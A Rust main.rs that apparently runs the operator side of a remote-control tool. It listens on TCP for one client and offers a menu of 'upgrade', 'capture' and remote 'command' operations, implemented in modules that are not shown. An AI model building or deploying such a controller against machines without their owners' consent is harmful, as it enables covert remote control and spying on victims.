mod behaviour;
mod network;

use std::env;
use std::io::{stdin, stdout, Write};
use std::process::Command;
use anyhow::{anyhow, Result};
use log::{error, info, LevelFilter};
use tokio::net::{TcpListener, TcpStream};

pub fn read_line() -> Result<String> {
    let mut line = String::new();
    stdin().read_line(&mut line)?;
    Ok(line)
}

#[tokio::main]
async fn main() -> Result<()>{
    env_logger::builder().filter_level(LevelFilter::Debug).init();
    let host = env::var("host").unwrap_or_else(|_| "127.0.0.1".to_string());
    let port = env::var("port").map_or(Ok(25565), |port| port.parse())?;
    info!("Waiting for client connect on {}:{}...", host, port);
    let server = TcpListener::bind((host, port)).await?;
    let (mut client, address) = server.accept().await?;
    info!("Client connected from {}.", address);
    loop {
        print!("\
Please enter the operation code:
    0: exit
    1: cls
    2: upgrade
    3: capture
    4: command
The operation code: "); stdout().flush()?;
        match read_line()?.trim().parse() {
            Ok(code) => {
                if code == 0 {
                    break;
                }
                let res = behaviour(&mut client, code).await;
                if let Err(e) = res {
                    error!("Runtime error: {:?}", e);
                }
            },
            Err(e) => {
                error!("Invalid code: {}", e);
            }
        }
        println!();
    }
    Ok(())
}

async fn behaviour(client: &mut TcpStream, code: u8) -> Result<()> {
    match code {
        1 => { Command::new("cmd").arg("/c").arg("cls").spawn()?.wait()?; },
        2 => { behaviour::upgrade(client).await?; },
        3 => { behaviour::capture(client).await?; },
        4 => { behaviour::command(client).await?; },
        _ => { Err(anyhow!("Invalid operation code."))? },
    }
    Ok(())
}
